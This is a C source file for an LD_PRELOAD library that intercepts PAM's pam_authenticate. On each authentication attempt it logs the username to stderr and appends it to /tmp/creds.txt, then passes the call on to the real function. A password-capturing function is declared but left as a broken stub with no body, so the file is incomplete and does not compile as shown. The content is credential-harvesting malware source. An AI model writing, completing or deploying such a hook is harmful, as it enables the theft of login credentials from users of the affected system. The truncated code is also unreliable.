#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

typedef int (*pam_authenticate_t)(pam_handle_t *, int);

void get_username(pam_handle_t *pamh) {
    const char *username = NULL;

    if (pam_get_item(pamh, PAM_USER, (const void **)&username) == PAM_SUCCESS && username) {
        fprintf(stderr, "USER =>>>>> %s\n", username);

        FILE *file = fopen("/tmp/creds.txt", "a");
        if (file) {
            fprintf(file, "Username: %s\n", username);
            fclose(file);
        } else {
            perror("Failed to open creds.txt for writing");
        }
    } else {
        perror("Failed to retrieve username");
    }
}


void get_password()

int pam_authenticate(pam_handle_t *pamh, int flags) {
    static pam_authenticate_t original_pam_authenticate = NULL;

    if (!original_pam_authenticate) {
        original_pam_authenticate = (pam_authenticate_t)dlsym(RTLD_NEXT, "pam_authenticate");
        if (!original_pam_authenticate) {
            fprintf(stderr, "Error loading original pam_authenticate: %s\n", dlerror());
            exit(EXIT_FAILURE);
        }
    }

    get_username(pamh);

    int result = original_pam_authenticate(pamh, flags);

    return result;
}

